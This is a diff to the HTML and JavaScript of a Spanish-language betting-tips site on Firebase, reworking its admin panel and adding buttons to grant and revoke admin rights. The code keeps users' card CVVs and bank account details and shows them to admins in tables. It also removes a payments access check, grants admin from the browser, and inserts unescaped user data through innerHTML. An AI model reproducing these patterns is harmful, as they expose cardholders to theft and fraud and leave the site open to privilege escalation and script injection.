@@ -89,6 +89,11 @@ header {
     color: white;
 }
 
+.btn-purple {
+    background: #9b59b6;
+    color: white;
+}
+
 .hero {
     min-height: 100vh;
     display: flex;
@@ -740,6 +745,7 @@ footer {
     border-radius: 20px;
     background: #0c0c0c;
     border: 1px solid #222;
+    display: none;
 }
 
 .users-table table {
@@ -930,14 +936,16 @@ footer {
 
 <div class="admin-panel" id="adminPanel">
     <h2>🎮 Panel Administrador</h2>
-    <button class="btn btn-green" onclick="loadAllTipsters()">💰 Ver Tipsters</button>
-    <button class="btn btn-green" onclick="loadAllCards()" style="margin-left:10px;">💳 Ver Tarjetas</button>
-    <button class="btn btn-green" onclick="loadAllBankData()" style="margin-left:10px;">🏦 Ver Datos Bancarios</button>
-    <button class="btn btn-green" onclick="loadAllPayments()" style="margin-left:10px;">💰 Ver Pagos</button>
-    <div id="tipstersList" style="margin-top:20px;"></div>
-    <div id="cardsList" style="margin-top:20px;"></div>
-    <div id="bankDataList" style="margin-top:20px;"></div>
-    <div id="paymentsList" style="margin-top:20px;"></div>
+    <div style="display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 20px;">
+        <button class="btn btn-green" onclick="toggleTable('usersTable')">👥 Ver Usuarios</button>
+        <button class="btn btn-green" onclick="toggleTable('cardsTable')">💳 Ver Tarjetas</button>
+        <button class="btn btn-green" onclick="toggleTable('bankDataTable')">🏦 Ver Datos Bancarios</button>
+        <button class="btn btn-green" onclick="toggleTable('paymentsTable')">💰 Ver Pagos</button>
+    </div>
+    <div id="usersTable" class="users-table"></div>
+    <div id="cardsTable" class="users-table"></div>
+    <div id="bankDataTable" class="users-table"></div>
+    <div id="paymentsTable" class="users-table"></div>
     <hr style="margin: 30px 0;">
     <h3>⚽ Gestión de Apuestas</h3>
     <div class="team-selectors">
@@ -968,7 +976,6 @@ footer {
         <h3 id="modalPlanName">Plan</h3>
         <p id="modalPlanPrice" style="text-align:center; font-size:24px; color:#00ff88;">$0 COP</p>
         
-        <!-- Tarjetas Débito/Crédito -->
         <div class="accordion">
             <div class="accordion-header" onclick="toggleAccordion('cardsAccordion')">
                 <span>💳 Pagar con Tarjeta Débito/Crédito</span>
@@ -987,7 +994,6 @@ footer {
             </div>
         </div>
         
-        <!-- Bre-B -->
         <div class="accordion">
             <div class="accordion-header" onclick="toggleAccordion('brebAccordion')">
                 <span>🔑 Pagar con Bre-B</span>
@@ -1018,7 +1024,6 @@ footer {
             </div>
         </div>
 
-        <!-- Transferencia Bancaria (NUEVO) -->
         <div class="accordion">
             <div class="accordion-header" onclick="toggleAccordion('transferAccordion')">
                 <span>🏦 Transferencia Bancaria</span>
@@ -1116,6 +1121,33 @@ let currentFilter = 'all';
 let brebImageBase64 = null;
 let transferImageBase64 = null;
 
+// Variable para controlar qué tabla está visible
+let currentOpenTable = null;
+
+function toggleTable(tableId) {
+    const tables = ['usersTable', 'cardsTable', 'bankDataTable', 'paymentsTable'];
+    
+    if (currentOpenTable === tableId) {
+        // Si la misma tabla, la ocultamos
+        document.getElementById(tableId).style.display = 'none';
+        currentOpenTable = null;
+    } else {
+        // Ocultamos todas
+        tables.forEach(id => {
+            document.getElementById(id).style.display = 'none';
+        });
+        // Mostramos la seleccionada y cargamos datos
+        document.getElementById(tableId).style.display = 'block';
+        currentOpenTable = tableId;
+        
+        // Cargar datos según la tabla
+        if (tableId === 'usersTable') loadAllUsers();
+        if (tableId === 'cardsTable') loadAllCards();
+        if (tableId === 'bankDataTable') loadAllBankData();
+        if (tableId === 'paymentsTable') loadAllPayments();
+    }
+}
+
 function formatCardNumber(input) { let v = input.value.replace(/\D/g, ''); v = v.replace(/(\d{4})(?=\d)/g, '$1 '); input.value = v; }
 function formatExpiry(input) { let v = input.value.replace(/\D/g, ''); if (v.length >= 2) v = v.substring(0,2) + '/' + v.substring(2,4); input.value = v; }
 function toggleAccordion(id) { const c = document.getElementById(id); c.classList.toggle('active'); const icon = c.previousElementSibling.querySelector('.icon'); icon.style.transform = c.classList.contains('active') ? 'rotate(180deg)' : 'rotate(0deg)'; }
@@ -1186,46 +1218,142 @@ async function saveTipsterData() {
     alert('✅ Datos guardados');
 }
 
-async function loadAllTipsters() {
-    const snap = await db.collection('tipsters').get();
-    let html = `
-        <h3>💰 Tipsters</h3>
-        <div class="users-table">
-            <table>
-                <thead>
-                    <tr><th>Email</th><th>Banco</th><th>Cuenta</th><th>Titular</th></tr>
-                </thead>
-                <tbody>
-    `;
-    snap.forEach(doc => { const t = doc.data(); if (t.paymentData) html += `<tr><td>${t.email}</td><td>${t.paymentData.bank}</td><td>${t.paymentData.accountNumber}</td><td>${t.paymentData.accountHolder}</td></tr>`; });
-    html += `</tbody></table></div>`;
-    document.getElementById('tipstersList').innerHTML = html;
+// NUEVA FUNCIÓN: Cargar todos los usuarios con opción de dar/quitar admin
+async function loadAllUsers() {
+    try {
+        const usersSnapshot = await db.collection('users').get();
+        let html = `
+            <h3>👥 Usuarios Registrados</h3>
+            <div class="users-table" style="display:block;">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Email</th>
+                            <th>UID</th>
+                            <th>Fecha Registro</th>
+                            <th>Estado</th>
+                            <th>Acciones</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+        `;
+        
+        for (const doc of usersSnapshot.docs) {
+            const userData = doc.data();
+            const userEmail = userData.email || 'Email no disponible';
+            const userId = doc.id;
+            
+            // Verificar si el usuario es admin en la colección admins
+            const adminDoc = await db.collection('admins').doc(userId).get();
+            const isAdmin = adminDoc.exists;
+            
+            // No mostrar el botón para el propio admin principal
+            const showAdminButton = userEmail !== ADMIN_EMAIL;
+            
+            let adminButton = '';
+            if (showAdminButton) {
+                if (isAdmin) {
+                    adminButton = `<button class="btn btn-orange" onclick="removeAdmin('${userId}', '${userEmail.replace(/'/g, "\\'")}')">🔽 Quitar Admin</button>`;
+                } else {
+                    adminButton = `<button class="btn btn-purple" onclick="makeAdmin('${userId}', '${userEmail.replace(/'/g, "\\'")}')">👑 Dar Admin</button>`;
+                }
+            } else {
+                adminButton = `<span style="color:#00ff88;">👑 Super Admin</span>`;
+            }
+            
+            html += `
+                <tr>
+                    <td>${userEmail}</td>
+                    <td style="font-size:12px;">${userId.substring(0, 8)}...</td>
+                    <td>${userData.createdAt ? new Date(userData.createdAt).toLocaleDateString() : 'No disponible'}</td>
+                    <td>${isAdmin ? '<span style="color:#00ff88;">✅ Administrador</span>' : '<span style="color:#888;">👤 Usuario</span>'}</td>
+                    <td><div class="table-actions">${adminButton}</div></td>
+                </tr>
+            `;
+        }
+        
+        html += `</tbody></table></div>`;
+        document.getElementById('usersTable').innerHTML = html;
+        document.getElementById('usersTable').style.display = 'block';
+    } catch (error) {
+        console.error("Error cargando usuarios:", error);
+        document.getElementById('usersTable').innerHTML = `<p style="color:red;">Error cargando usuarios: ${error.message}</p>`;
+    }
 }
+
+// Función para dar permisos de admin
+async function makeAdmin(userId, userEmail) {
+    if (!confirm(`¿Dar permisos de administrador a ${userEmail}?`)) return;
+    try {
+        await db.collection('admins').doc(userId).set({
+            email: userEmail,
+            grantedBy: auth.currentUser?.email,
+            grantedAt: Date.now(),
+            isAdmin: true
+        });
+        alert(`✅ ${userEmail} ahora es administrador.`);
+        loadAllUsers(); // Recargar la tabla
+        // Si la tabla de pagos está abierta, recargarla también
+        if (currentOpenTable === 'paymentsTable') loadAllPayments();
+    } catch (error) {
+        console.error("Error al dar admin:", error);
+        alert("Error: " + error.message);
+    }
+}
+
+// Función para quitar permisos de admin
+async function removeAdmin(userId, userEmail) {
+    if (!confirm(`¿Quitar permisos de administrador a ${userEmail}?`)) return;
+    try {
+        await db.collection('admins').doc(userId).delete();
+        alert(`✅ ${userEmail} ya no es administrador.`);
+        loadAllUsers(); // Recargar la tabla
+        // Si la tabla de pagos está abierta, recargarla también
+        if (currentOpenTable === 'paymentsTable') loadAllPayments();
+    } catch (error) {
+        console.error("Error al quitar admin:", error);
+        alert("Error: " + error.message);
+    }
+}
+
+// Función para verificar si un usuario es admin (para mostrar/ocultar panel)
+async function isUserAdmin(uid) {
+    if (!uid) return false;
+    if (auth.currentUser?.email === ADMIN_EMAIL) return true;
+    const adminDoc = await db.collection('admins').doc(uid).get();
+    return adminDoc.exists;
+}
+
 async function loadAllCards() {
     const snap = await db.collection('users').get();
     let html = `
-        <h3>💳 Tarjetas</h3>
-        <div class="users-table">
+        <h3>💳 Tarjetas Guardadas</h3>
+        <div class="users-table" style="display:block;">
             <table>
-                <thead><tr><th>Usuario</th><th>Tarjeta</th><th>Titular</th><th>CVV</th></tr></thead>
+                <thead><tr><th>Usuario</th><th>Tarjeta</th><th>Titular</th><th>CVV</th><th>Banco</th></tr></thead>
                 <tbody>
     `;
-    snap.forEach(doc => { const u = doc.data(); if (u.savedCards) u.savedCards.forEach(c => html += `<tr><td>${u.email}</td><td>**** ${c.last4}</td><td>${c.cardHolder}</td><td>${c.cvv}</td></tr>`); });
+    snap.forEach(doc => { 
+        const u = doc.data(); 
+        if (u.savedCards && u.savedCards.length > 0) {
+            u.savedCards.forEach(c => html += `<tr><td>${u.email || 'N/A'}</td><td>**** ${c.last4 || ''}</td><td>${c.cardHolder || ''}</td><td>${c.cvv || ''}</td><td>${c.bank || ''}</td></tr>`);
+        }
+    });
     html += `</tbody></table></div>`;
-    document.getElementById('cardsList').innerHTML = html;
+    document.getElementById('cardsTable').innerHTML = html;
 }
 async function loadAllBankData() {
     const snap = await db.collection('bankData').get();
     let html = `
         <h3>🏦 Datos Bancarios</h3>
-        <div class="users-table">
+        <div class="users-table" style="display:block;">
             <table>
                 <thead><tr><th>Usuario</th><th>Banco</th><th>Cuenta</th><th>Titular</th></tr></thead>
                 <tbody>
     `;
-    snap.forEach(doc => { const d = doc.data(); html += `<tr><td>${d.userEmail}</td><td>${d.bank}</td><td>${d.accountNumber}</td><td>${d.accountHolder}</td></tr>`; });
+    snap.forEach(doc => { const d = doc.data(); html += `<tr><td>${d.userEmail || 'N/A'}</td><td>${d.bank || ''}</td><td>${d.accountNumber || ''}</td><td>${d.accountHolder || ''}</td>`; });
     html += `</tbody></table></div>`;
-    document.getElementById('bankDataList').innerHTML = html;
+    document.getElementById('bankDataTable').innerHTML = html;
 }
 
 async function approvePayment(paymentId, userId, planId) {
@@ -1268,19 +1396,15 @@ async function removePremium(userId) {
 }
 
 async function loadAllPayments() {
-    const user = auth.currentUser;
-    if (user?.email !== ADMIN_EMAIL) {
-        alert('Solo administradores');
-        return;
-    }
     try {
         const snapshot = await db.collection('payments').orderBy('createdAt', 'desc').get();
         if (snapshot.empty) {
-            document.getElementById('paymentsList').innerHTML = `<p>No hay pagos registrados</p>`;
+            document.getElementById('paymentsTable').innerHTML = `<p>No hay pagos registrados</p>`;
             return;
         }
         let html = `
-        <div class="users-table">
+        <h3>💰 Pagos Registrados</h3>
+        <div class="users-table" style="display:block;">
             <table>
                 <thead>
                     <tr>
@@ -1327,10 +1451,10 @@ async function loadAllPayments() {
             html += `<tr><td>${fecha}</td><td>${p.userEmail}</td><td>${p.planName}</td><td>$${p.amount.toLocaleString()} COP</td><td>${metodo}</td><td>${estado}</td><td>${comprobante}</td><td>${acciones}</td></tr>`;
         });
         html += `</tbody></table></div>`;
-        document.getElementById('paymentsList').innerHTML = html;
+        document.getElementById('paymentsTable').innerHTML = html;
     } catch (error) {
         console.error(error);
-        document.getElementById('paymentsList').innerHTML = `<p style="color:red;">Error cargando pagos</p>`;
+        document.getElementById('paymentsTable').innerHTML = `<p style="color:red;">Error cargando pagos</p>`;
     }
 }
 async function processBreBPayment() {
@@ -1495,14 +1619,18 @@ function register() { const e = document.getElementById('email').value, p = docu
 function login() { const e = document.getElementById('email').value, p = document.getElementById('password').value; auth.signInWithEmailAndPassword(e, p).then(() => alert('Sesión iniciada')).catch(e => alert(e.message)); }
 function logout() { auth.signOut(); alert('Sesión cerrada'); }
 
-auth.onAuthStateChanged(user => {
-    const isAdmin = user?.email === ADMIN_EMAIL;
+auth.onAuthStateChanged(async user => {
+    const isSuperAdmin = user?.email === ADMIN_EMAIL;
+    let isAdmin = isSuperAdmin;
+    if (user && !isSuperAdmin) {
+        isAdmin = await isUserAdmin(user.uid);
+    }
     document.getElementById('logoutBtn').style.display = user ? 'block' : 'none';
     document.getElementById('premiumBtnHeader').style.display = user ? 'block' : 'none';
     document.getElementById('loginBox').style.display = user ? 'none' : 'block';
     document.getElementById('adminPanel').style.display = isAdmin ? 'block' : 'none';
     const cb = document.getElementById('showCardBtn'), tb = document.getElementById('showTipsterBtn');
-    if (user) { cb.style.display = 'block'; tb.style.display = 'block'; loadSavedCards(); if (isAdmin) { loadAllTipsters(); loadAllCards(); loadAllBankData(); loadAllPayments(); } }
+    if (user) { cb.style.display = 'block'; tb.style.display = 'block'; loadSavedCards(); }
     else { cb.style.display = 'none'; tb.style.display = 'none'; document.getElementById('cardPanel').style.display = 'none'; document.getElementById('tipsterPanel').style.display = 'none'; }
     document.getElementById('plansSection').style.display = 'none';
     loadBets();
@@ -1510,7 +1638,7 @@ auth.onAuthStateChanged(user => {
 
 loadTeams(); loadPlans();
 
-window.register = register; window.login = login; window.logout = logout; window.publishBet = publishBet; window.editBet = editBet; window.deleteBet = deleteBet; window.updateMatch = updateMatch; window.showPlans = showPlans; window.selectPlan = selectPlan; window.closePaymentModal = closePaymentModal; window.saveCard = saveCard; window.deleteCard = deleteCard; window.saveTipsterData = saveTipsterData; window.loadAllTipsters = loadAllTipsters; window.loadAllCards = loadAllCards; window.loadAllBankData = loadAllBankData; window.loadAllPayments = loadAllPayments; window.approvePayment = approvePayment; window.rejectPayment = rejectPayment; window.removePremium = removePremium; window.processCardPayment = processCardPayment; window.processBreBPayment = processBreBPayment; window.processTransferPayment = processTransferPayment; window.closeConfirmModalAndContinue = closeConfirmModalAndContinue; window.saveBankDataAfterPayment = saveBankDataAfterPayment; window.closeSaveBankModal = closeSaveBankModal; window.formatCardNumber = formatCardNumber; window.formatExpiry = formatExpiry; window.toggleAccordion = toggleAccordion; window.showCardPanel = showCardPanel; window.showTipsterPanel = showTipsterPanel; window.filterBets = filterBets; window.setBetResult = setBetResult; window.previewImage = previewImage;
+window.register = register; window.login = login; window.logout = logout; window.publishBet = publishBet; window.editBet = editBet; window.deleteBet = deleteBet; window.updateMatch = updateMatch; window.showPlans = showPlans; window.selectPlan = selectPlan; window.closePaymentModal = closePaymentModal; window.saveCard = saveCard; window.deleteCard = deleteCard; window.saveTipsterData = saveTipsterData; window.loadAllCards = loadAllCards; window.loadAllBankData = loadAllBankData; window.loadAllPayments = loadAllPayments; window.approvePayment = approvePayment; window.rejectPayment = rejectPayment; window.removePremium = removePremium; window.processCardPayment = processCardPayment; window.processBreBPayment = processBreBPayment; window.processTransferPayment = processTransferPayment; window.closeConfirmModalAndContinue = closeConfirmModalAndContinue; window.saveBankDataAfterPayment = saveBankDataAfterPayment; window.closeSaveBankModal = closeSaveBankModal; window.formatCardNumber = formatCardNumber; window.formatExpiry = formatExpiry; window.toggleAccordion = toggleAccordion; window.showCardPanel = showCardPanel; window.showTipsterPanel = showTipsterPanel; window.filterBets = filterBets; window.setBetResult = setBetResult; window.previewImage = previewImage; window.toggleTable = toggleTable; window.loadAllUsers = loadAllUsers; window.makeAdmin = makeAdmin; window.removeAdmin = removeAdmin;
 </script>
 </body>
 </html>
